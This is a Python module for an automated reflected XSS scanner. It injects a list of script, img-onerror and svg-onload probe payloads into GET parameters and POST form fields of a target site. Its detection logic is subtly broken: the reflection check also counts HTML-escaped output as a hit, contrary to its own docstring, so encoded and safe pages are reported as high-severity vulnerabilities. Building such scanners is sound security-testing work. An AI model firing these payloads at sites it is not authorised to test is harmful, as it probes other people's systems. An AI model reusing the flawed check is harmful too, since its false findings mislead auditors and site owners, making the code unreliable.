"""Reflected XSS detection module (US-10).

Detects reflected Cross-Site Scripting vulnerabilities by injecting
XSS payloads into GET parameters and form inputs, then checking
if the payload is reflected unencoded in the response.
"""

import html as html_module
from typing import Any
from urllib.parse import urlencode, urlparse, urlunparse, parse_qs, urljoin

from bs4 import BeautifulSoup

from src.utils.http import get, safe_session
from src.utils.logger import get_logger

logger = get_logger(__name__)

# XSS test payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=confirm(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "';alert(1);//",
    "\" onmouseover=\"alert(1)\"",
    "<INPUT onmouseover=alert(1)>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<marquee onscroll=alert(1)>",
]


def _is_reflected(payload: str, response_text: str) -> bool:
    """Check if a payload is reflected (unencoded) in the response.

    Performs both exact match and context-aware checks.

    Args:
        payload: The injected XSS payload.
        response_text: The HTTP response body.

    Returns:
        True if the payload is reflected unencoded.
    """
    # Check exact match (most telling)
    if payload in response_text:
        return True

    # Check if a simplified version is reflected (quotes stripped)
    simplified = payload.replace("'", "").replace('"', "")
    if simplified and simplified in response_text:
        return True

    # Check for HTML-encoded reflection
    encoded = html_module.escape(payload)
    if encoded in response_text:
        return True

    return False


def _extract_forms_from_page(page_url: str, session: Any = None) -> list[dict[str, Any]]:
    """Fetch a page and extract all forms.

    Args:
        page_url: URL to fetch and parse.
        session: Optional requests session.

    Returns:
        List of form dicts with action, method, inputs.
    """
    response = get(page_url, session=session)
    if response is None:
        return []

    soup = BeautifulSoup(response.text, "html.parser")
    forms: list[dict[str, Any]] = []

    for form in soup.find_all("form"):
        action = form.get("action", "")
        method = form.get("method", "GET").upper()
        inputs: list[dict[str, str]] = []

        for inp in form.find_all(["input", "textarea", "select"]):
            inp_type = inp.get("type", "text") if inp.name == "input" else inp.name
            inp_name = inp.get("name", "")
            inp_value = inp.get("value", "")
            inputs.append({
                "type": inp_type,
                "name": inp_name,
                "value": inp_value,
            })

        action_url = urljoin(page_url, action) if action else page_url

        forms.append({
            "action": action_url,
            "method": method,
            "inputs": inputs,
        })

    return forms


def scan_xss(target_url: str, forms: list | None = None) -> dict[str, Any]:
    """Scan for reflected XSS vulnerabilities.

    Args:
        target_url: The target URL to scan.
        forms: Optional list of forms from the crawler. If None,
               forms will be scraped from the page.

    Returns:
        Dict with status and findings:
        - ``status``: ``"success"``, ``"partial"``, or ``"error"``
        - ``data``: dict with ``findings`` list
    """
    logger.info(f"Starting XSS scan on {target_url}")

    findings: list[dict[str, Any]] = []

    # Validate target
    if not target_url or not isinstance(target_url, str):
        return {
            "status": "error",
            "data": {"findings": []},
        }

    # Ensure URL has scheme
    if not target_url.startswith(("http://", "https://")):
        target_url = f"https://{target_url}"

    session = safe_session(timeout=10)

    try:
        # Get target page content and forms
        target_forms = forms
        if target_forms is None:
            target_forms = _extract_forms_from_page(target_url, session=session)

        # -- Test GET parameters --
        parsed_url = urlparse(target_url)
        base_params = parse_qs(parsed_url.query, keep_blank_values=True)

        if not base_params:
            base_params = {"id": [""], "q": [""], "search": [""], "page": [""]}

        for param in base_params:
            for payload in XSS_PAYLOADS:
                try:
                    # Inject payload into the parameter
                    params = parse_qs(parsed_url.query, keep_blank_values=True)
                    params[param] = [payload]
                    new_query = urlencode(params, doseq=True)
                    injected_url = urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        new_query,
                        parsed_url.fragment,
                    ))

                    resp = session.get(injected_url, timeout=10)
                    if resp is None:
                        continue

                    reflected = _is_reflected(payload, resp.text)

                    if reflected:
                        # Determine context where reflected
                        context = _determine_context(payload, resp.text)
                        finding = {
                            "param": param,
                            "method": "GET",
                            "payload": payload,
                            "reflected": True,
                            "context": context,
                            "severity": "high",
                            "cvss_score": 6.5,
                            "url": injected_url,
                            "status_code": resp.status_code,
                        }
                        findings.append(finding)
                        logger.info(
                            f"XSS (GET) found: {param}={payload[:30]} "
                            f"reflected in {context}"
                        )
                except Exception as exc:
                    logger.warning(f"XSS test failed for {param}: {exc}")
                    continue

        # -- Test POST form inputs --
        for form in target_forms:
            form_action = form.get("action", target_url)
            method = form.get("method", "GET").upper()
            inputs = form.get("inputs", [])

            if method != "POST":
                continue

            text_inputs = [
                inp for inp in inputs
                if inp["type"] in ("text", "search", "textarea", "") and inp["name"]
            ]

            for inp in text_inputs:
                param = inp["name"]

                for payload in XSS_PAYLOADS:
                    try:
                        form_data: dict[str, str] = {}
                        for field in inputs:
                            field_name = field["name"]
                            if field_name == param:
                                form_data[field_name] = payload
                            elif field.get("value"):
                                form_data[field_name] = field["value"]
                            else:
                                form_data[field_name] = ""

                        resp = session.post(
                            form_action, data=form_data, timeout=10
                        )

                        if resp is None:
                            continue

                        reflected = _is_reflected(payload, resp.text)

                        if reflected:
                            context = _determine_context(payload, resp.text)
                            finding = {
                                "param": param,
                                "method": "POST",
                                "payload": payload,
                                "reflected": True,
                                "context": context,
                                "severity": "high",
                                "cvss_score": 6.5,
                                "url": form_action,
                                "status_code": resp.status_code,
                            }
                            findings.append(finding)
                            logger.info(
                                f"XSS (POST) found: {param}={payload[:30]} "
                                f"reflected in {context}"
                            )
                    except Exception as exc:
                        logger.warning(
                            f"XSS POST test failed for {param}: {exc}"
                        )
                        continue

    except Exception as exc:
        logger.error(f"XSS scan failed: {exc}")
        return {
            "status": "error",
            "data": {"findings": findings},
        }
    finally:
        session.close()

    status = "success" if len(findings) > 0 else "partial"
    return {
        "status": status,
        "data": {"findings": findings},
    }


def _determine_context(payload: str, response_text: str) -> str:
    """Determine where in the HTML the payload is reflected.

    Args:
        payload: The injected XSS payload.
        response_text: The HTTP response body.

    Returns:
        A string describing the reflection context:
        ``"html"``, ``"attribute"``, ``"script"``, ``"unknown"``.
    """
    if payload in response_text:
        # Find the context around the payload
        index = response_text.index(payload)

        # Look backwards for context clues
        before = response_text[max(0, index - 200):index]

        if "<script" in before.lower():
            return "script"
        if "=" in before and ('"' in before or "'" in before):
            return "attribute"
        return "html"

    # Check if simplified version is reflected
    simplified = payload.replace("'", "").replace('"', "")
    if simplified and simplified in response_text:
        return "simplified"

    return "unknown"


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "http://testphp.vulnweb.com"
    result = scan_xss(target)
    print(f"Status: {result['status']}")
    print(f"Findings: {len(result['data']['findings'])}")
    for f in result['data']['findings']:
        print(f"  [{f['severity']}] {f['param']} ({f['context']})")
